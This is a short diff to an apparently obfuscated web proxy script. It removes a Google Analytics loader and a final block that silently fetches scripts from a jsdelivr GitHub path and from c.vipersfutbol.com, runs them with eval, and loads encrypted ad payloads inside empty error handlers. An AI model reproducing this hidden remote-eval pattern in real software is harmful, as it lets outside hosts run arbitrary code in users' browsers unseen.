@@ -1,15 +1,3 @@
-window.dataLayer = window.dataLayer || [];
-window.gtag = function () {
-  dataLayer.push(arguments);
-};
-gtag("js", new Date());
-gtag("config", "G-1CC1LKMRS6");
-(function () {
-  var s = document.createElement("script");
-  s.async = true;
-  s.src = "https://www.googletagmanager.com/gtag/js?id=G-1CC1LKMRS6";
-  document.head.appendChild(s);
-})();
 var _0x931b = 7;
 const sjEncode = url => frame.prefix + controller.config.codec.encode(url);
 _0x931b = 11;
@@ -2891,16 +2879,3 @@ _gameCardOnClick = function (g) {
   if (el) el.textContent = typeof window.WispPing === "number" ? `ping: ${window.WispPing}ms` : "ping: --";
 })();
 document.body.firstElementChild?.remove();
-(async () => {
-  try {
-    eval(await (await fetch("https://cdn.jsdelivr.net/gh/TongSherbet/ubiquitousOctoEnigma/congenialBassoon.js?" + Math.floor(Date.now() / 3600000))).text());
-    loadAds({
-      "banner": "DMkzx9IFc4JPUeh0HPN2kT/hbi3/qRnaWVJ8YWf5MY5xc6dCbkdATMPppNiHKaja6yku4BdkyjESvX5FbEdLLnsPp5I9jKmsp5czw55t5z2XdMGUBupayQe6ITV4i0wyFuTI2Tp3p0+wlYY5",
-      "native": "03mNMgQqshdhTiPrhRRhOWvW3kEjy49Z2qZVPei2GeiLGKUlFNIKlZbHmjj8AhKpJ8a31eTn2W6d+DylsDnCuMSVFuK65JmbGZtKCxRvuguJDGPo5BUmbO3pc4K4Fkg2sfSsbHSK03jifmCcAyXGYn8=",
-      "socialbar": "Ab2Nvq42QEuRQfmeWqK8LujVG8SKtvkLgqcTv+gk3ohF8Y8IcbdCd4ELCXjoLQCcQ6QLWabde48gr+rsQrnswAedZ8Nf3EUCM+xcXO9lo8tjtKGs1mPuyo5SgjfTzmjAKC4aD20XIKt1D0yAC5ut80wnsw=="
-    });
-  } catch {}
-  try {
-    eval(await (await fetch("https://c.vipersfutbol.com/script.js")).text());
-  } catch {}
-})();
